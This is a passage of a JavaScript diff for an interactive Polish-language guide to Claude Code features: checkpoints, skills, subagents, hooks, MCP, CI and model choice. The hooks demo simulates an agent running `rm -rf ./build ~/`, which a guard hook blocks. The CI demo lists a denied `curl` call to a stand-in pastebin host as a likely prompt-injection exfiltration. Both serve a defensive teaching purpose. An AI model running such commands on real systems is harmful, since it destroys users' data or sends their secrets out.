+      say(st, `Checkpoint zapisany, potem ${P[i][0]}: ${P[i][2]}.`);
+      await sleep(650); if (my !== run) return;
+      steps[i](); paint(); pEls[i].classList.remove('run');
+      await sleep(350);
+    }
+    played = true;
+    say(st, 'P4 zepsuł testy. Dwa wyjścia: cofnij kod albo cofnij tylko rozmowę.', 'warn');
+  }
+  async function code() {
+    if (rewound) reset();
+    await play(); const my = run; rewound = true;
+    say(st, 'Cofam kod + rozmowę do checkpointu przed P2…'); await sleep(500); if (my !== run) return;
+    for (let i = 1; i < 4; i++) pEls[i].classList.add('gone');
+    files.utils = { v: 'slugify() v1 ✓' }; files.posts = { v: V0.posts };
+    paint(); await sleep(400);
+    fEls.notes.classList.add('bad');
+    say(st, '<b>utils.ts i posts.ts przywrócone</b> — Claude edytował je swoimi narzędziami plikowymi. <b>notes.txt nadal zniknął</b>: został usunięty komendą Bash, a checkpointy nie śledzą Bash. Od tego jest git.', 'bad');
+  }
+  async function conv() {
+    if (rewound) reset();
+    await play(); const my = run; rewound = true;
+    say(st, 'Cofam tylko rozmowę do stanu przed P4…'); await sleep(500); if (my !== run) return;
+    pEls[3].classList.add('gone');
+    say(st, '<b>Rozmowa cofnięta, kod zachowany.</b> P4 zniknął z pamięci Claude, ale utils.ts nadal ma wersję z regexem. Przydatne, gdy kod jest OK, a czat po prostu zjechał na manowce.', 'warn');
+  }
+  $('[data-act=play]', root).onclick = () => enqueue(play);
+  $('[data-act=code]', root).onclick = () => enqueue(code);
+  $('[data-act=conv]', root).onclick = () => enqueue(conv);
+  $('[data-act=reset]', root).onclick = reset;
+  reset();
+  registerFig(root, { first() { enqueue(play); enqueue(() => sleep(900)); enqueue(code); } });
+})();
+
+/* ---------- 9. skille ---------- */
+(() => {
+  const root = $('#fig-skills'), shelf = $('#sk-shelf'), main = $('#sk-main'), sub = $('#sk-sub'), st = $('#sk-status');
+  const SK = {
+    api: ['api-style', 'Konwencje REST, format błędów, paginacja. Użyj przy dodawaniu lub zmienianiu endpointów API.', 'auto-invocable', ''],
+    pdf: ['pdf-report', 'Buduj raporty PDF wg naszego szablonu. Użyj do eksportów.', 'auto-invocable', ''],
+    deploy: ['deploy', '(ukryta przed Claude)', 'disable-model-invocation: true', 'hidden-model'],
+    rel: ['release-notes', 'Napisz notatki wydania na podstawie scalonych PR.', 'context: fork', '']
+  };
+  const cards = {};
+  for (const k in SK) {
+    const [n, d, fm, cls] = SK[k];
+    cards[k] = H('div', 'skill ' + cls, `<div class="nm">/${n}</div><div>${d}</div><div class="fm">${fm}</div>`, shelf);
+  }
+  const CAP = 60000;
+  let v, run = 0;
+  const enqueue = makeQueue();
+  function paint() {
+    paintBar(main, [{ k: 'sys', v: 16000, c: TOK.sys, t: 'system+narzędzia' }, { k: 'mem', v: v.desc, c: TOK.mem, t: 'opisy' },
+      { k: 'work', v: v.body, c: TOK.work, t: 'załadowane treści skilli' }, { k: 'sum', v: v.ret, c: TOK.sum, t: 'wynik' }], CAP);
+    paintBar(sub, [{ k: 'w', v: v.sub, c: TOK.work, t: 'tu działa release-notes' }], CAP);
+  }
+  function reset() { run++; v = { desc: 1500, body: 0, ret: 0, sub: 0 }; Object.values(cards).forEach(c => c.classList.remove('active', 'forked')); paint(); say(st, 'Na starcie ładują się tylko opisy — poza skillą z przerywaną ramką, której Claude nawet nie widzi.'); }
+  const acts = {
+    async auto(my) {
+      say(st, 'Twój prompt: „dodaj endpoint /invoices”. Claude porównuje go z <em>opisami</em> skilli…');
+      await sleep(700); if (my !== run) return;
+      if (!cards.api.classList.contains('active')) {
+        cards.api.classList.add('active');
+        const b0 = v.body; await tween(600, k => { v.body = b0 + 8000 * k; paint(); });
+      }
+      say(st, '<b>api-style</b> pasuje („Use when adding or changing API endpoints”) i jej pełna treść się załadowała. <b>pdf-report</b> zostało jednolinijkowym opisem. Dlatego opisy muszą mówić <em>kiedy</em>.', 'ok');
+    },
+    async deploy(my) {
+      cards.deploy.classList.add('active');
+      const b0 = v.body; await tween(500, k => { v.body = b0 + 5000 * k; paint(); });
+      say(st, '<b>/deploy</b> było niewidoczne dla Claude (zero kontekstu), dopóki <em>Ty</em> go nie wpisałeś. Wszystko ze skutkami ubocznymi powinno tak działać — Claude nigdy nie powinien sam decydować o deployu.', 'ok');
+    },
+    async fork(my) {
+      cards.rel.classList.add('forked');
+      say(st, '<b>/release-notes</b> ma <code>context: fork</code>: działa w forkowanym subagencie…');
+      await tween(900, k => { v.sub = 30000 * k; paint(); }); if (my !== run) return;
+      await tween(400, k => { v.ret = 1500 * k; paint(); });
+      say(st, '30K czytania git log i PR-ów zostało w forku. Twoja główna sesja dostała tylko gotowe notatki.', 'ok');
+    }
+  };
+  for (const k in acts) $(`[data-act=${k}]`, root).onclick = () => enqueue(() => acts[k](run));
+  $('[data-act=reset]', root).onclick = reset;
+  reset();
+  registerFig(root, { first() { enqueue(() => acts.auto(run)); enqueue(() => acts.fork(run)); } });
+})();
+
+/* ---------- 10. subagenci ---------- */
+(() => {
+  const root = $('#fig-sub'), main = $('#sub-main'), grid = $('#sub-grid'), st = $('#sub-status');
+  const CAP = 200000;
+  const AREAS = [
+    ['💳 płatności', ['stripe/client.ts', 'webhooks.ts', 'retry.ts', 'queue.ts', 'tests/…']],
+    ['🔐 auth', ['session.ts', 'refresh.ts', 'oauth.ts', 'middleware.ts', 'tests/…']],
+    ['✉️ e-mail', ['mailer.ts', 'templates/', 'bounce.ts', 'worker.ts', 'tests/…']]
+  ];
+  const subs = AREAS.map(([n]) => {
+    const d = H('div', 'subag', `<b>${n}</b> <span class="mut">Subagent Explore</span><div class="ctx-bar sub" style="margin:.3rem 0"></div><div class="fn"></div>`, grid);
+    return { el: d, bar: $('.ctx-bar', d), fn: $('.fn', d) };
+  });
+  let v, run = 0;
+  const enqueue = makeQueue();
+  function paint() {
+    paintBar(main, [{ k: 'sys', v: 21000, c: TOK.sys, t: 'system+pamięć' }, { k: 'work', v: v.work, c: TOK.noise, t: 'surowe odczyty plików' }, { k: 'sum', v: v.sum, c: TOK.sum, t: 'podsumowania' }], CAP);
+  }
+  function reset() { run++; v = { work: 0, sum: 0 }; paint(); subs.forEach(s => { s.el.classList.remove('live'); s.bar.innerHTML = ''; s.fn.textContent = ''; }); say(st, 'To samo pytanie, dwie strategie. Patrz, gdzie ląduje czytanie.'); }
+  async function inline(my) {
+    reset(); run = my;
+    for (const [n, files] of AREAS) {
+      say(st, `Czytam ${n} w środku: ${files.join(', ')}…`);
+      const w0 = v.work; await tween(700, k => { v.work = w0 + 38000 * k; paint(); });
+      if (my !== run) return;
+    }
+    say(st, '<b>114K surowej treści plików</b> siedzi teraz w Twoim głównym kontekście. Odpowiedź jest tam gdzieś w środku — razem z wszystkim, co Claude przeczytał, by ją znaleźć. Reszta sesji jest wolniejsza, droższa i głośniejsza.', 'bad');
+  }
+  async function delegate(my) {
+    reset(); run = my;
+    say(st, 'Trzej subagenci Explore startują równolegle, każdy z własnym świeżym kontekstem…');
+    subs.forEach(s => s.el.classList.add('live'));
+    await Promise.all(subs.map(async (s, i) => {
+      const files = AREAS[i][1];
+      await tween(1400, k => {
+        paintBar(s.bar, [{ k: 'w', v: 38000 * k, c: TOK.work, t: kfmt(38000 * k) }], 40000);
+        s.fn.textContent = files.slice(0, 1 + Math.floor(k * (files.length - 1))).join(' · ');
+      });
+    }));
+    if (my !== run) return;
+    await tween(600, k => { v.sum = 4500 * k; paint(); });
+    say(st, '<b>+4.5K</b> w głównym: trzy krótkie podsumowania („płatności ponawiają 3× z exponential backoff w retry.ts:42…”). 114K czytania zostało w subagentach, a działali w tym samym czasie.', 'ok');
+  }
+  $('[data-act=inline]', root).onclick = () => enqueue(() => inline(run + 1));
+  $('[data-act=delegate]', root).onclick = () => enqueue(() => delegate(run + 1));
+  $('[data-act=reset]', root).onclick = reset;
+  reset();
+  registerFig(root, { first() { enqueue(() => delegate(run + 1)); } });
+})();
+
+/* ---------- 11. hooki ---------- */
+(() => {
+  const root = $('#fig-hooks'), tg = $('#hk-tg'), evs = $('#hk-evs'), log = $('#hk-log'), st = $('#hk-status');
+  const EV = ['SessionStart', 'UserPromptSubmit', 'PreToolUse', '⚙ narzędzie działa', 'PostToolUse', 'Stop', 'SessionEnd'];
+  const evEl = EV.map((e, i) => H('div', 'ev' + (i === 3 ? ' tool' : ''), e.replace(/([a-z])([A-Z])/g, '$1<wbr>$2'), evs));
+  const HOOKS = [
+    ['ctx', 'SessionStart', false, '<b>SessionStart</b> → wstrzyknij „Sprint 42: migracja billingu, zamrożenie na legacy/”'],
+    ['guard', 'PreToolUse', true, '<b>PreToolUse</b> <code>Bash</code> → zablokuj <code>rm -rf</code> poza projektem (exit 2)'],
+    ['fmt', 'PostToolUse', true, '<b>PostToolUse</b> <code>Edit|Write</code> → uruchom prettier na pliku'],
+    ['notify', 'Stop', false, '<b>Stop</b> → powiadomienie na desktopie „Claude skończył”']
+  ];
+  const cb = {};
+  HOOKS.forEach(([k, , on, html]) => {
+    const l = H('label', '', `<input type="checkbox"${on ? ' checked' : ''}> <span>${html}</span>`, tg);
+    cb[k] = $('input', l); cb[k].onchange = paintHooked;
+  });
+  function paintHooked() { evEl.forEach(e => e.classList.remove('hooked')); HOOKS.forEach(([k, ev]) => { if (cb[k].checked) evEl[EV.indexOf(ev)].classList.add('hooked'); }); }
+  let run = 0;
+  const enqueue = makeQueue();
+  async function fire(my, i, ms = 380) {
+    if (my !== run) return false;
+    evEl.forEach(e => e.classList.remove('fire')); evEl[i].classList.add('fire');
+    await sleep(ms); return my === run;
+  }
+  const L = (t, c) => logLine(log, t, c);
+  function reset() { run++; log.innerHTML = ''; evEl.forEach(e => e.classList.remove('fire')); paintHooked(); say(st, 'Tura: Claude edytuje plik, potem próbuje <code>rm -rf ./build ~/</code> (ups — zabłąkane <code>~/</code>).'); }
+  async function turn() {
+    const my = ++run; log.innerHTML = '';
+    if (!await fire(my, 0)) return;
+    L('▸ SessionStart'); if (cb.ctx.checked) L('  🪝 dodano kontekst: "Sprint 42: migracja billingu, zamrożenie na legacy/"', 'g');
+    if (!await fire(my, 1)) return;
+    L('▸ UserPromptSubmit: "rename the build step and clean old output"', 'u');
+    // wywołanie narzędzia 1: edycja
+    if (!await fire(my, 2)) return; L('▸ PreToolUse Edit(build.config.ts) — brak matchera Bash, przechodzi');
+    if (!await fire(my, 3)) return; L('  ⚙ Edit zastosowany');
+    if (!await fire(my, 4)) return;
+    L('▸ PostToolUse Edit'); if (cb.fmt.checked) L('  🪝 prettier --write build.config.ts → sformatowany', 'g');
+    // wywołanie narzędzia 2: bash rm
+    if (!await fire(my, 2, 500)) return; L('▸ PreToolUse Bash(rm -rf ./build ~/)');
+    if (cb.guard.checked) {
+      L('  🪝 block-dangerous.sh → exit 2: "refusing rm -rf outside the project: ~/"', 'e');
+      say(st, '<b>Zablokowane.</b> Kod wyjścia 2 zatrzymał wywołanie, a stderr wrócił do Claude jako powód.', 'warn');
+      await sleep(700); if (my !== run) return;
+      L('● Claude: "~/ było pomyłką — usuwam tylko ./build."');
+      if (!await fire(my, 2)) return; L('▸ PreToolUse Bash(rm -rf ./build) → exit 0');
+      if (!await fire(my, 3)) return; L('  ⚙ usunięto ./build', 'g');
+    } else {
+      if (!await fire(my, 3, 600)) return;
+      L('  ⚙ rm -rf ./build ~/  💥 Twój katalog domowy zniknął (symulacja)', 'e');
+    }
+    if (!await fire(my, 4)) return; L('▸ PostToolUse Bash — brak matchera');
+    if (!await fire(my, 5)) return;
+    L('▸ Stop'); if (cb.notify.checked) L('  🪝 🔔 powiadomienie: "Claude skończył"', 'g');
+    if (!await fire(my, 6)) return; L('▸ SessionEnd');
+    evEl.forEach(e => e.classList.remove('fire'));
+    say(st, cb.guard.checked
+      ? '<b>Strażnik utrzymał.</b> „Nigdy nie usuwaj poza projektem” w CLAUDE.md <em>prawdopodobnie</em> by zadziałało. Hook działa <em>zawsze</em> — i Claude sam się skorygował na podstawie powodu.'
+      : '<b>Bez strażnika, bez gwarancji.</b> Prośba o uprawnienia mogłaby Cię uratować — chyba że byłeś w permisywnym trybie i kliknąłeś dalej. Włącz z powrotem hook PreToolUse.', cb.guard.checked ? 'ok' : 'bad');
+  }
+  $('[data-act=run]', root).onclick = () => enqueue(turn);
+  $('[data-act=reset]', root).onclick = reset;
+  reset();
+  registerFig(root, { first() { enqueue(turn); } });
+})();
+
+/* ---------- 12. MCP ---------- */
+(() => {
+  const root = $('#fig-mcp'), svg = $('#mcp-svg'), cfg = $('#mcp-cfg'), toolsEl = $('#mcp-tools'), st = $('#mcp-status'), scopeSel = $('#mcp-scope');
+  const CX = 210, CY = 150;
+  const edges = S('g', {}, svg), nodesG = S('g', {}, svg);
+  const cg = S('g', { class: 'nd' }, nodesG);
+  S('circle', { cx: CX, cy: CY, r: 40 }, cg); T(cg, CX, CY + 5, '🧠 Claude', { 'font-size': 12.5 });
+  const SV = {
+    gh: { n: '🐙 GitHub', x: 75, y: 55, type: 'http', url: 'https://api.githubcopilot.com/mcp/', tools: ['list_pull_requests', 'get_pull_request_files', 'create_issue', 'search_code'] },
+    db: { n: '🐘 Postgres', x: 345, y: 55, type: 'stdio', url: 'npx -y @bytebase/dbhub', tools: ['execute_sql', 'list_tables'] },
+    pw: { n: '🎭 Playwright', x: 75, y: 245, type: 'stdio', url: 'npx @playwright/mcp@latest', tools: ['browser_navigate', 'browser_click', 'browser_snapshot'] }
+  };
+  let state, run = 0;
+  const enqueue = makeQueue();
+  function cfgText(k) {
+    const s = SV[k], sc = scopeSel.value, name = { gh: 'github', db: 'db', pw: 'playwright' }[k];
+    if (sc === 'project') return `.mcp.json  (commituj to; koledzy zatwierdzają przy pierwszym użyciu)\n{ "mcpServers": { "${name}": { "type": "${s.type}", ${s.type === 'http' ? `"url": "${s.url}"` : `"command": "${s.url.split(' ')[0]}", …`} } } }`;
+    if (sc === 'user') return `~/.claude.json → mcpServers.${name}\n(Ty, każdy projekt na tej maszynie)`;
+    return `~/.claude.json → projects["/repo"].mcpServers.${name}\n(Ty, tylko ten projekt — zasięg domyślny)`;
+  }
+  function reset() {
+    run++; state = { on: {} }; edges.innerHTML = ''; [...nodesG.children].slice(1).forEach(n => n.remove());
+    toolsEl.innerHTML = '<span>Read</span><span>Edit</span><span>Bash</span><span>Grep</span><span>WebFetch</span><span>…</span>';
+    cfg.textContent = '—'; say(st, 'Jeszcze brak serwerów. Claude może używać tylko wbudowanych narzędzi.');
+  }
+  async function add(k) {
+    if (state.on[k]) return;
+    const s = SV[k]; state.on[k] = { tools: {} };
+    const ln = S('line', { x1: CX, y1: CY, x2: CX, y2: CY, class: 'edge' }, edges);
+    await tween(400, t => { ln.setAttribute('x2', CX + (s.x - CX) * t); ln.setAttribute('y2', CY + (s.y - CY) * t); });
+    const g = S('g', { class: 'nd pop' }, nodesG);
+    S('rect', { x: s.x - 58, y: s.y - 20, width: 116, height: 40, rx: 9 }, g);
+    T(g, s.x, s.y + 1, s.n, { 'font-size': 12 }); T(g, s.x, s.y + 14, s.type, { 'font-size': 9, 'font-weight': 400 });
+    state.on[k].g = g;
+    s.tools.forEach(t => { const sp = H('span', '', `mcp__${k === 'gh' ? 'github' : k === 'db' ? 'db' : 'playwright'}__${t}`, toolsEl); state.on[k].tools[t] = sp; });
+    cfg.textContent = cfgText(k);
+    say(st, `<b>${s.n}</b> podłączony. Tylko jego <em>nazwy narzędzi</em> weszły do kontekstu (${s.tools.length} krótkich wpisów). Pełne schematy JSON zostają odłożone, dopóki Claude faktycznie nie użyje narzędzia.`, 'ok');
+  }
+  async function ask() {
+    const my = ++run;
+    if (!state.on.gh) { say(st, 'Claude nie ma jak zobaczyć GitHuba. W najlepszym razie poprosi Cię o wklejenie listy PR-ów; w najgorszym zgadnie. Najpierw dodaj serwer GitHub.', 'bad'); return; }
+    const s = SV.gh;
+    say(st, 'Claude wybiera <code>list_pull_requests</code> — jej pełny schemat ładuje się teraz (tool search)…');
+    state.on.gh.tools.list_pull_requests.classList.add('full');
+    await flyDot(svg, CX, CY, s.x, s.y, { ms: 500, color: C.accent2 }); if (my !== run) return;
+    await flyDot(svg, s.x, s.y, CX, CY, { ms: 400 }); if (my !== run) return;
+    state.on.gh.tools.get_pull_request_files.classList.add('full');
+    for (let i = 0; i < 3; i++) { await flyDot(svg, CX, CY, s.x, s.y, { ms: 250, color: C.accent2, r: 4 }); if (my !== run) return; }
+    say(st, '<b>„#412, #418 i #421 dotykają src/billing/”</b> (dane demo). Użyto dwóch narzędzi, załadowały się dwa schematy; pozostałe narzędzia nadal kosztują tylko swoje nazwy. Uruchom <code>/context all</code>, by zobaczyć, ile tokenów zużywa każde narzędzie MCP.', 'ok');
+  }
+  async function plugin() {
+    const my = ++run;
+    if (state.plugin) return;
+    state.plugin = true;
+    const x = 335, y = 205;
+    S('line', { x1: CX, y1: CY, x2: x, y2: y, class: 'edge' }, edges);
+    const g = S('g', { class: 'nd pop' }, nodesG);
+    S('rect', { x: x - 58, y: y - 18, width: 116, height: 36, rx: 9 }, g); T(g, x, y + 5, '📦 acme-tools', { 'font-size': 12 });
+    say(st, '<code>/plugin install acme-tools@your-org</code> — jeden pakiet…'); await sleep(600); if (my !== run) return;
+    const parts = ['🧩 skilla /acme-tools:release', '🕵️ agent: reviewer', '🪝 hook: PostToolUse', '🔌 MCP: jira'];
+    for (let i = 0; i < parts.length; i++) {
+      const tt = T(nodesG, x, y + 34 + i * 15, parts[i], { 'font-size': 10.5 });
+      tt.style.opacity = 0; await tween(250, k => { tt.style.opacity = k; }); if (my !== run) return;
+    }
+    H('span', 'full', 'acme-tools:release', toolsEl); H('span', '', 'mcp__plugin_acme-tools_jira__search_issues', toolsEl);
+    say(st, '…rozpakowuje się w skillę z przestrzenią nazw, subagenta, hook i serwer MCP. Tak zespół dzieli jedną konfigurację między wieloma repozytoriami.', 'ok');
+  }
+  $('[data-act=gh]', root).onclick = () => enqueue(() => add('gh'));
+  $('[data-act=db]', root).onclick = () => enqueue(() => add('db'));
+  $('[data-act=pw]', root).onclick = () => enqueue(() => add('pw'));
+  $('[data-act=ask]', root).onclick = () => enqueue(ask);
+  $('[data-act=plugin]', root).onclick = () => enqueue(plugin);
+  scopeSel.onchange = () => { const ks = Object.keys(state.on); if (ks.length) cfg.textContent = cfgText(ks[ks.length - 1]); };
+  $('[data-act=reset]', root).onclick = reset;
+  reset();
+  registerFig(root, { first() { enqueue(() => add('gh')); enqueue(() => add('db')); enqueue(ask); } });
+})();
+
+/* ---------- 13. wybór trybu równoległego ---------- */
+(() => {
+  const root = $('#fig-par'), scen = $('#par-scen'), appr = $('#par-appr'), st = $('#par-status');
+  const A = {
+    subagent: ['subagenci', 'izolowana poboczna sprawa'], worktree: ['claude -w', 'własny branch i pliki'], background: ['/background', 'odłącz, sprawdź później'],
+    team: ['zespół agentów', 'lider + dyskutujący koledzy'], workflow: ['workflow', 'skrypt uruchamia wielu agentów'], goal: ['/goal', 'aż warunek się spełni'],
+    loop: ['/loop', 'powtarzaj na interwał'], routine: ['/schedule', 'rutyna w chmurze']
+  };
+  const SC = [
+    ['Znajdź, jak działają ponowne próby w 3 serwisach, nie zalewając mojej sesji', 'subagent', 'Krótkie, niezależne pytania badawcze → <b>subagenci</b>. Każdy czyta we własnym oknie i zwraca podsumowanie. Poproś: „użyj subagentów, żeby…”.'],
+    ['Zbuduj 3 niepowiązane funkcje naraz bez kolizji plików', 'worktree', '<b>Worktrees</b>: <code>claude -w search</code>, <code>claude -w billing</code>… Każda sesja dostaje własny checkout i branch pod <code>.claude/worktrees/</code>, dzieląc historię gita.'],
+    ['Zacznij długi refaktor, zamknij terminal, sprawdź później', 'background', '<b>Sesje w tle</b>: <code>/background</code> odłącza sesję; <code>claude agents</code> (widok agentów) wysyła je i monitoruje. Wróć, dołączając z widoku agentów (albo <code>claude attach &lt;id&gt;</code>); <code>claude -r</code> otwiera ją ponownie po zakończeniu.'],
+    ['Błąd z 3 konkurującymi teoriami — agenci powinni się spierać i dojść do wniosku', 'team', '<b>Zespół agentów</b> (eksperymentalne): lider tworzy kolegów, którzy badają różne hipotezy i wymieniają wiadomości, by kwestionować odkrycia.'],
+    ['Zmigruj 500 plików i miej drugiego agenta weryfikującego każdą zmianę', 'workflow', '<b>Dynamiczny workflow</b>: Claude pisze skrypt, który rozgałęzia subagentów i sprawdza wyniki krzyżowo; możesz go uruchomić ponownie. Dla dużej mechanicznej zmiany dołączona skilla <code>/batch</code> dzieli ją między subagentów w ich własnych worktrees.'],
+    ['Pracuj, aż każdy test w module przejdzie', 'goal', '<b>/goal</b> „all tests in src/billing pass”: po każdej turze mały model sprawdza warunek; jeśli nie spełniony, Claude bierze kolejną turę.'],
+    ['Sprawdzaj status deployu co 5 minut, gdy pracuję', 'loop', '<b>/loop 5m check the deploy and tell me if it fails</b>. Zakres sesji: kończy się, gdy sesja się kończy.'],
+    ['Segreguj nowe issue co noc, nawet z zamkniętym laptopem', 'routine', '<b>Rutyna</b> przez <code>/schedule</code>: działa w chmurze na cron, wywołanie API albo zdarzenia GitHub. Nie trzeba otwartego terminala.']
+  ];
+  const aEl = {};
+  for (const k in A) aEl[k] = H('div', '', `<b>${A[k][0]}</b>${A[k][1]}`, appr);
+  const bEl = SC.map(([t, k, why], i) => { const b = H('button', '', t, scen); b.onclick = () => pick(i); return b; });
+  function pick(i) {
+    bEl.forEach((b, j) => b.classList.toggle('on', i === j));
+    Object.values(aEl).forEach(e => e.classList.remove('win'));
+    if (i < 0) return say(st, 'Każdy scenariusz podświetla podejście, które pasuje najlepiej.');
+    aEl[SC[i][1]].classList.add('win');
+    say(st, SC[i][2], 'ok');
+  }
+  let timer;
+  registerFig(root, {
+    async first() { for (const i of [0, 1, 4]) { pick(i); await sleep(1300); } },
+    leave() { clearTimeout(timer); }
+  });
+})();
+
+/* ---------- 14. CI ---------- */
+(() => {
+  const root = $('#fig-ci'), box = $('#ci-box'), st = $('#ci-status');
+  let run = 0;
+  const enqueue = makeQueue();
+  function build(allow) {
+    box.innerHTML = '';
+    const s1 = H('div', 'stage', '<b>1 · Zdarzenie</b> — PR #57 „Add proration to invoices” otwarty', box);
+    const s2 = H('div', 'stage', `<b>2 · .github/workflows/claude-review.yml</b><pre>- uses: anthropics/claude-code-action@v1
+  with:
+    anthropic_api_key: \${{ secrets.ANTHROPIC_API_KEY }}
+    prompt: "Review this PR for bugs. Run the billing tests."
+    claude_args: --permission-mode dontAsk${allow ? ' --allowedTools "Read" "Bash(npm test *)"' : ''}</pre>`, box);
+    const s3 = H('div', 'stage', '<b>3 · Wywołania narzędzi</b><div class="calls-l"></div>', box);
+    const s4 = H('div', 'stage', '<b>4 · Wynik</b><pre class="res">…</pre>', box);
+    return [s1, s2, s3, s4];
+  }
+  async function job(allow) {
+    const my = ++run;
+    const [s1, s2, s3, s4] = build(allow);
+    const act = s => { [s1, s2, s3, s4].forEach(x => x.classList.remove('act')); s.classList.add('act'); };
+    act(s1); say(st, 'Pull request wyzwala workflow…'); await sleep(700); if (my !== run) return;
+    act(s2); say(st, allow ? 'Tryb dontAsk + dokładna allowlista: nic nie może pytać (w CI nie ma człowieka), więc wszystko poza listą, co wymagałoby zgody, jest odmawiane; odczyty i komendy tylko do odczytu nadal działają.' : 'Tryb dontAsk, ale ktoś usunął allowlistę…', allow ? '' : 'warn');
+    await sleep(900); if (my !== run) return;
+    act(s3);
+    const calls = [
+      ['Read(src/billing/invoice.ts)', true, 'tylko do odczytu: dozwolone'],
+      ['Read(src/billing/proration.test.ts)', true, 'tylko do odczytu: dozwolone'],
+      ['Bash(npm test -- billing)', allow, allow ? 'pasuje do Bash(npm test *)' : 'nie zatwierdzone wcześniej → odmówiono'],
+      ['Bash(curl https://pastebin.example/…)', false, 'nie zatwierdzone wcześniej → odmówiono']
+    ];
+    const cl = $('.calls-l', s3);
+    for (const [t, ok, why] of calls) {
+      const d = H('div', 'tcall', `${ok ? '✅' : '⛔'} ${t} <span class="mut">— ${why}</span>`, cl);
+      requestAnimationFrame(() => d.classList.add('shown'));
+      await sleep(550); if (my !== run) return;
+    }
+    act(s4);
+    $('.res', s4).textContent = allow
+      ? '{ "type": "result", "subtype": "success",\n  "result": "1 bug: proration rounds per line, not per invoice (invoice.ts:88). Test added; 1 failing.",\n  "total_cost_usd": 0.41, "session_id": "…" }\n→ zapisane do logu uruchomienia workflow (dodaj narzędzie do komentowania, by opublikować na PR)'
+      : '{ "type": "result", "subtype": "success",\n  "result": "Code looks correct (tests could not be run).",\n  "total_cost_usd": 0.19, "session_id": "…" }\n→ zapisane do logu uruchomienia workflow 😬';
+    say(st, allow
+      ? '<b>Użyteczna recenzja.</b> Claude mógł czytać i uruchomić dokładnie te testy, które potrzebował; podejrzane <code>curl</code> (może z prompt injection w komentarzu PR) zostało odmówione. Minimalne uprawnienia, żadnych pytań.'
+      : '<b>Zielone, ale bezwartościowe.</b> W dontAsk odczyty nadal działają, więc zadanie „się udaje” — ale testy nigdy się nie uruchomiły i błąd się prześlizgnął. Recenzja w CI jest tak dobra, jak narzędzia, na które zezwalasz.', allow ? 'ok' : 'bad');
+  }
+  $('[data-act=run]', root).onclick = () => enqueue(() => job(true));
+  $('[data-act=noallow]', root).onclick = () => enqueue(() => job(false));
+  $('[data-act=reset]', root).onclick = () => { run++; build(true); say(st, 'Zadanie działa w trybie dontAsk: tylko odczyty plus wcześniej zatwierdzone narzędzia.'); };
+  build(true);
+  registerFig(root, { first() { enqueue(() => job(true)); } });
+})();
+
+/* ---------- 15. model i wysiłek ---------- */
+(() => {
+  const root = $('#fig-model'), sel = $('#md-task'), fast = $('#md-fast'), pick = $('#md-pick'), st = $('#md-status');
+  const bars = { depth: $('#md-depth'), speed: $('#md-speed'), cost: $('#md-cost') };
+  const D = {
+    rename: ['sonnet · /effort low', 20, 90, 15, 'Mechaniczna zmiana z jasną linią mety. Niski wysiłek jest szybki i tani; nawet <code>haiku</code> radzi sobie z wieloma takimi zadaniami.', false],
+    feature: ['sonnet · /effort medium–high', 55, 60, 45, 'Plan już zawiera trudne myślenie. Solidny model średniej wielkości przy domyślnym wysiłku wykonuje go dobrze — to tu błyszczy <code>opusplan</code>.', false],
+    debug: ['opus · /effort high', 80, 35, 70, 'Subtelne błędy wynagradzają głębsze rozumowanie: więcej rozważonych hipotez, mniej błędnych poprawek. Podnieś wysiłek na tę sesję, obniż potem.', true],
+    arch: ['opus albo fable · /effort xhigh · plan mode', 95, 20, 90, 'Projektowanie i trudne refaktory to miejsce, gdzie najlepsze modele i wysoki wysiłek zarabiają na swoją cenę. Użyj plan mode, by myślenie dało plan do recenzji. <code>max</code> może przemyśleć za dużo — przetestuj przed przyjęciem.', true]
+  };
+  function paint() {
+    const [p, d, s, c, why, opus] = D[sel.value];
+    let sp = s, co = c, label = p, note = why;
+    if (fast.checked) {
+      if (opus) { sp = Math.min(100, s * 2.2); co = Math.min(100, c + 25); label += ' · /fast'; note += ' <b>Tryb fast:</b> ten sam model Opus, do ~2,5× szybszy wynik, wyższy koszt na token — na te sytuacje, gdy czekasz na niego interaktywnie.'; }
+      else note += ' <b>Tryb fast</b> działa tylko na Opusie — włączenie go przełącza Cię z Sonneta na Opusa — więc nie jest częścią tego wyboru Sonneta.';
+    }
+    pick.textContent = label;
+    bars.depth.style.width = d + '%'; bars.speed.style.width = sp + '%'; bars.cost.style.width = co + '%';
+    say(st, note);
+  }
+  sel.onchange = paint; fast.onchange = paint;
+  registerFig(root, {
+    async first() {
+      for (const k of ['rename', 'feature', 'debug', 'arch']) { sel.value = k; paint(); await sleep(900); }
+      sel.value = 'feature'; paint();
+    }
+  });
+  paint();
+})();
+
+/* ---------- 16. drabina eksperta + klinika ---------- */
+(() => {
+  const root = $('#fig-expert'), habitsEl = $('#ex-habits'), ladder = $('#ex-ladder'), st = $('#ex-status'), patEl = $('#ex-pat'), fixEl = $('#ex-fix');
+  const LV = [
+    ['1 · Początkujący', ['Uruchamiam claude w repozytorium i zadaję pytania', 'Przerywam przez Esc i steruję wcześnie']],
+    ['2 · Codzienny kierowca', ['Moje repo ma krótki CLAUDE.md (/init, przycięty)', 'Używam plan mode dla zmian na wielu plikach', 'Zawsze daję Claude test albo komendę do weryfikacji', 'Robię /clear między niepowiązanymi zadaniami']],
+    ['3 · Zaawansowany użytkownik', ['Mam reguły uprawnień allow/ask/deny', 'Moje powtarzalne playbooki to skille', 'Deleguję ciężkie badania do subagentów']],
+    ['4 · Budowniczy', ['Używam hooków (formatowanie, strażnicy, powiadomienia)', 'Podłączyłem serwery MCP, których używam codziennie', 'Uruchamiam równoległe sesje w worktrees']],
+    ['5 · Ekspert', ['Uruchamiam claude -p w CI albo skryptach', 'Dzielę się naszą konfiguracją jako pluginem', 'Używam /goal, rutyn albo workflow do długiej pracy']]
+  ];
+  let saved = {};
+  try { saved = JSON.parse(localStorage.getItem('cc-guide-habits') || '{}'); } catch (e) { saved = {}; }
+  const cbs = [];
+  LV.forEach(([name, hs], li) => hs.forEach((h, hi) => {
+    const id = li + '-' + hi;
+    const l = H('label', '', `<input type="checkbox"${saved[id] ? ' checked' : ''}> <span>${h}</span>`, habitsEl);
+    const cb = $('input', l); cb.onchange = () => { saved[id] = cb.checked; try { localStorage.setItem('cc-guide-habits', JSON.stringify(saved)); } catch (e) { } paint(); };
+    cbs.push({ li, cb, h });
+  }));
+  const rungs = LV.map(([n]) => H('div', 'rung', `<b>${n}</b>`, ladder));
+  function paint() {
+    let level = 0;
+    for (let li = 0; li < LV.length; li++) { if (cbs.filter(c => c.li === li).every(c => c.cb.checked)) level = li + 1; else break; }
+    rungs.forEach((r, i) => { r.classList.toggle('reached', i < level); r.classList.toggle('next', i === level); });
